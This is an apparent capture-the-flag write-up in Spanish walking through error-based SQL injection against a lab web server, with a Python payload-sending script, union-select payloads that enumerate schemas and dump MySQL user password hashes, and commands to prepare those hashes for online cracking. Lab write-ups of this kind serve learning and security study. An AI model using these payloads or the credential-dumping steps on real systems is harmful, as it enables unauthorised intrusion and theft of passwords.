## Vulnerability Assessment {-}


### SQL Injection Error Based con Python {-}

La idea aqui es crear un script en python que nos injecte el comando deseado y que filtre la respuesta al lado del servidor que 
queremos.

```python
#!/usr/bin/python3

import requests
import re
import signal
import sys
import time

def def_handler(sig, frame):
    print("\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+c
signal.signal(signal.SIGINT, def_handler)

# Variables_globales
sqli_url = "http://10.10.10.167/search_products.php"

def makeRequest(injection):
    post_data = {
        'productName: '%s' % injection
    }

    headers = {
        'X-Forwarded-For': '192.168.4.28'
    }

    r = requests.post(sqli_url, data=post_data, headers=headers)
    response = re.findall(r'\<tbody\>\r\n\t\t\t\t\t\t\t(.*?)\t\t\t\t\t\t\<\/tbody\>', r.text[0])

    print("\n + response + \n")


if __name__ == '__main__':
    while True:
        injection = input("[+] Payload: ")
        if injection != "exit":
            makeRequest(injection)
        else:
            print("\n[!] Saliendo...\n")
            sys.exit(0)

```

si lanzamos el script con `rlwrap python3 sqli_injection.py` y a la entrada payload le ponemos el apostrofe, podemos ver el error. Ya podemos enumerar
la base de datos.

1. Miramos cuantas columnas hay

    ```bash
    [+] Payload : ' order by 100-- -
    [+] Payload : ' order by 10-- -
    [+] Payload : ' order by 8-- -
    [+] Payload : ' order by 7-- -
    [+] Payload : ' order by 6-- -
    ```

    Al `' order by 6-- -` nos sale No product Found, ya sabemos que hay 6 columnas

1. Aplicamos el union select

    ```bash
    [+] Payload : ' union select 1,2,3,4,5,6-- -
    ```

    Vemos que se estan colandos la etiquetas

1. Listamos la base de datos actual en uso y el usuario

    ```bash
    [+] Payload : ' union select 1,2,database(),4,5,6-- -
    [+] Payload : ' union select 1,2,version(),4,5,6-- -
    [+] Payload : ' union select 1,2,user(),4,5,6-- -
    ```

    La base de datos se llama warehouse de typo MariaDB version 10.4.8 y el usuario manager@localhost

1. Miramos si podemos leer archivos de la maquina victima

    ```bash
    [+] Payload : ' union select 1,2,load_file("C:\Windows\System32\drivers\etc\hosts"),4,5,6-- -
    [+] Payload : ' union select 1,2,load_file("Windows\System32\drivers\etc\hosts"),4,5,6-- -
    [+] Payload : ' union select 1,2,load_file("0x433a5c57696e646f77735c53797374656d33325c647269766572731b74635c686f737473"),4,5,6-- -
    ```

    Parece que no podemos leer ficheros del systema.

    > [ ! ] NOTAS: el hexadecimal se hace con el comando `echo "C:\Windows\System32\drivers\etc\hosts" | tr -d '\n' | xxd -ps | xargs | tr -d ' '`

1. Enumeramos las tablas existentes de la base de datos

    ```bash
    [+] Payload : ' union select 1,2,group_concat(table_name),4,5,6 from information_schema.tables where table_schema="warehouse"-- -
    ```

    Vemos que hay una tabla product, product_category y product_pack. No parece que haya informacion relevante.

1. Enumerar las bases de datos del systema

    ```bash
    [+] Payload : ' union select 1,2,group_concat(schema_name),4,5,6 from information_schema.schemata-- -
    ```

    Hay 3 bases de datos information_schema, mysql y warehouse.

1. Enumeramos la base de datos mysql

    ```bash
    [+] Payload : ' union select 1,2,group_concat(table_name),4,5,6 from information_schema.tables where table_schema="mysql"-- -
    ```

    Hay muchas tablas y una es la tabla user

1. Enumeramos las columnas de la tabla user

    ```bash
    [+] Payload : ' union select 1,2,group_concat(column_name),4,5,6 from information_schema.columns where table_schema="mysql" and table_name="user"-- -
    ```

    Existe una columna user y una password

1. Accedemos a los usuarios y contrase単as de la base de datos

    ```bash
    [+] Payload : ' union select 1,2,group_concat(User,0x3a,Password),4,5,6 from mysql.user-- -
    ```

Copiamos los usuarios y la contrase単as en un fichero llamado hashes.

### Crackeamos las contrase単as con crackstation {-}

Tratamos las informaciones del fichero hash
 
```bash
cat hashes | tr ',' '\n' | sed 's/\*//g' | sort -u > hashes
cat hashes | awk '{print $2}' FS=":" | xclip -sel clip
```

Abrimos la web de [crackstation](https://crackstation.net/) y colamos los hashes. Encontramos las contrase単as de hector y de manager.

Aqui el problema es que no tenemos puertos que nos permite conectar a la maquina de manera directa. Tenemos que intentar otra cosa para 
poder ganar accesso al systema.
